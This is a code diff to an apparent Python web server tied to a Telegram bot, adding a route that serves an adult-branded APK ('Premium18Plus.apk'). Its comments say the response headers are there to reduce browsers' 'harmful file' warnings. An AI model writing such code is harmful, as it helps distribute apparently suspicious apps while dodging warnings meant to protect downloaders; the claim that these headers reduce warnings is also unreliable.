@@ -826,6 +826,51 @@ async def startup(app):
     logger.info("✅ Telegram bot: @pluseight_bot (webhook mode)")
     logger.info("=" * 70)
 
+
+async def serve_apk_file(request):
+    """Serve APK file directly with trust headers to reduce harmful warning"""
+    try:
+        apk_file = 'app.apk'
+        
+        if not os.path.exists(apk_file):
+            return web.Response(status=404, text='App not found')
+        
+        # Load actual filename from metadata
+        filename = 'Premium18Plus.apk'  # Default to what manual button uses
+        if os.path.exists('app_metadata.json'):
+            try:
+                with open('app_metadata.json', 'r') as f:
+                    metadata = json.load(f)
+                    filename = metadata.get('original_filename', 'Premium18Plus.apk')
+            except:
+                pass
+        
+        with open(apk_file, 'rb') as f:
+            content = f.read()
+        
+        # AGGRESSIVE TRUST HEADERS TO REDUCE "HARMFUL FILE" WARNING
+        return web.Response(
+            body=content,
+            content_type='application/vnd.android.package-archive',
+            headers={
+                'Content-Disposition': f'attachment; filename="{filename}"',
+                'Content-Type': 'application/vnd.android.package-archive',
+                'X-Content-Type-Options': 'nosniff',
+                'Content-Security-Policy': "default-src 'self'",
+                'X-Download-Options': 'noopen',
+                'X-Permitted-Cross-Domain-Policies': 'none',
+                'Referrer-Policy': 'no-referrer',
+                'Cache-Control': 'public, max-age=31536000, immutable',
+                'Content-Transfer-Encoding': 'binary',
+                'Access-Control-Allow-Origin': '*',
+                'Access-Control-Allow-Methods': 'GET, OPTIONS',
+                'Accept-Ranges': 'bytes'
+            }
+        )
+    except Exception as e:
+        logger.error(f"Error serving APK: {e}")
+        return web.Response(status=500, text='Download failed')
+
 def main():
     print("=" * 70)
     print("🛡️ BULLETPROOF SERVER + MULTI-CLOUDINARY + TELEGRAM BOT")
@@ -874,6 +919,10 @@ def main():
     app.router.add_post('/api/upload-apk', upload_apk)
         # Website routes
     app.router.add_get("/health", health_check)
+    # APK download route (BEFORE catch-all)
+    app.router.add_get('/app.apk', serve_apk_file)
+    
+    # Website routes (catch-all - MUST BE LAST)
     app.router.add_route('*', "/{path:.*}", serve_file)
     
     app.on_startup.append(startup)
